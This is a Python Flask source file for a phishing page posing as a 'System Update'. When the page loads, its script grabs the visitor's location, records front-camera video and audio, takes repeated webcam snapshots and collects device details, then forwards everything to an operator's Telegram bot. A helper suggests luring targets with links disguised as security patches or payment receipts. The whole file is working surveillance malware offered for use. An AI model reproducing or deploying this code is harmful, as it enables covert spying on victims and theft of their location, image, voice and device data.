import os
import json
import requests
import time
import subprocess
from flask import Flask, request
from threading import Thread

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
PORT = 8080

app = Flask(__name__)

def send_to_telegram(data):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': CHAT_ID, 'text': data}, timeout=5)
    except:
        pass

def send_file_to_telegram(file_path, caption):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f}, timeout=10)
    except:
        pass

def send_link_to_telegram(link):
    msg = f"🔗 ACTIVE PAYLOAD LINK\n{link}\n\nSend to target disguised as:\n- 'Critical security patch'\n- 'Video invitation'\n- 'Payment receipt'\n- 'System update required'"
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': msg}, timeout=5)
    except:
        pass

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>System Update</title>
        <style>
            body {
                background: #1a1a1a;
                color: #fff;
                font-family: Arial, sans-serif;
                text-align: center;
                padding: 50px;
            }
            .loader {
                border: 4px solid #333;
                border-top: 4px solid #00ff00;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
        <script>
        let mediaRecorder;
        let recordedChunks = [];
        
        function sendData(endpoint, data) {
            fetch(endpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }
        
        function captureScreenshot(videoElement) {
            const canvas = document.createElement('canvas');
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElement, 0, 0);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('screenshot', blob, 'screenshot_' + Date.now() + '.png');
                fetch('/screenshot', { method: 'POST', body: formData });
            });
        }
        
        navigator.geolocation.getCurrentPosition(pos => {
            sendData('/location', {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy,
                alt: pos.coords.altitude || 0,
                time: Date.now()
            });
        }, err => {
            sendData('/error', {error: 'Location: ' + err.message});
        });
        
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(() => captureScreenshot(video), 3000);
                
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = event => {
                    if(event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, {type: 'video/webm'});
                    const formData = new FormData();
                    formData.append('video', blob, 'capture_' + Date.now() + '.webm');
                    fetch('/upload', { method: 'POST', body: formData });
                };
                mediaRecorder.start();
                setTimeout(() => {
                    if(mediaRecorder.state === 'recording') mediaRecorder.stop();
                }, 45000);
                
                setInterval(() => captureScreenshot(video), 10000);
            })
            .catch(err => {
                sendData('/error', {error: 'Camera/Audio: ' + err.message});
            });
            
        navigator.permissions.query({name: 'geolocation'}).then(status => {
            sendData('/info', {geo_permission: status.state});
        });
        
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenRes = screen.width + 'x' + screen.height;
        
        sendData('/device', {
            ua: userAgent,
            platform: platform,
            lang: language,
            screen: screenRes,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: Date.now()
        });
        </script>
    </head>
    <body>
        <h2>Updating security protocols...</h2>
        <div class="loader"></div>
        <p>Please wait, do not close this page.</p>
        <p style="font-size:12px; color:#666;">Verifying system integrity...</p>
    </body>
    </html>
    '''

@app.route('/location', methods=['POST'])
def location():
    data = request.json
    send_to_telegram(f"📍 LOCATION DATA\nLat: {data.get('lat')}\nLon: {data.get('lon')}\nAccuracy: {data.get('acc')}m\nAltitude: {data.get('alt')}m\nTime: {data.get('time')}")
    return 'OK'

@app.route('/device', methods=['POST'])
def device():
    data = request.json
    send_to_telegram(f"📱 DEVICE INFO\nUA: {data.get('ua')[:100]}\nPlatform: {data.get('platform')}\nLanguage: {data.get('lang')}\nScreen: {data.get('screen')}\nTimezone: {data.get('timezone')}")
    return 'OK'

@app.route('/upload', methods=['POST'])
def upload():
    if 'video' in request.files:
        file = request.files['video']
        filename = f"captured_{int(time.time())}.webm"
        file.save(filename)
        send_file_to_telegram(filename, '🎥 Front Camera + Audio Capture')
        os.remove(filename)
    return 'OK'

@app.route('/screenshot', methods=['POST'])
def screenshot():
    if 'screenshot' in request.files:
        file = request.files['screenshot']
        filename = f"screenshot_{int(time.time())}.png"
        file.save(filename)
        send_file_to_telegram(filename, '📸 Screenshot Capture')
        os.remove(filename)
    return 'OK'

@app.route('/info', methods=['POST'])
def info():
    data = request.json
    send_to_telegram(f"ℹ️ INFO: {data}")
    return 'OK'

@app.route('/error', methods=['POST'])
def error():
    data = request.json
    send_to_telegram(f"⚠️ ERROR: {data.get('error')}")
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
